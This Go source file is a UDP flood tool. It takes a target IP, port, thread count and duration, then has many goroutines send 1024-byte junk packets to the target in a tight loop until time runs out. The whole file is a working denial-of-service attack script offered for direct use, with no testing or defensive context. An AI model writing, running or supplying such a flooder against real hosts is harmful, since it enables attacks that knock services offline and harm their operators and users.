package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func flood(wg *sync.WaitGroup, done <-chan struct{}, targetIP string, targetPort int, payload []byte) {
	defer wg.Done()

	address := &net.UDPAddr{
		IP:   net.ParseIP(targetIP),
		Port: targetPort,
	}
	conn, err := net.DialUDP("udp", nil, address)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		select {
		case <-done:
			return
		default:
			_, err := conn.Write(payload)
			if err != nil {
				return
			}
		}
	}
}

func main() {

	if len(os.Args) != 5 {
		fmt.Printf("Usage: %s <ip> <port> <threads> <timeout>\n", os.Args[0])
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("not valid port:", os.Args[2])
		os.Exit(1)
	}
	numThreads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("not valid thread:", os.Args[3])
		os.Exit(1)
	}

	timeout, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("not valid timeout:", os.Args[4])
		os.Exit(1)
	}

	payload := make([]byte, 1024)
	for i := range payload {
		payload[i] = 'A'
	}

	var wg sync.WaitGroup
	done := make(chan struct{})

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go flood(&wg, done, targetIP, targetPort, payload)
		//fmt.Println("Thread started:", i+1)
	}

	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
		close(done)
	})

	wg.Wait()
}
